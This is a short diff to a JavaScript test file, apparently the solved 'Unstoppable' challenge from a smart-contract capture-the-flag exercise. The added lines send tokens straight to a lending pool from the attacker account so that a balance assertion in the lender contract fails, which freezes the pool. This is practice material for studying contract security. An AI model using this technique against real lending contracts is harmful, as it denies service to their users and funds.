@@ -40,6 +40,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        // force assert on Line 36 in UnstoppableLender.sol to fail
+        await this.token.transfer(this.pool.address, ether('50'), { from: attacker })
     });
 
     after(async function () {
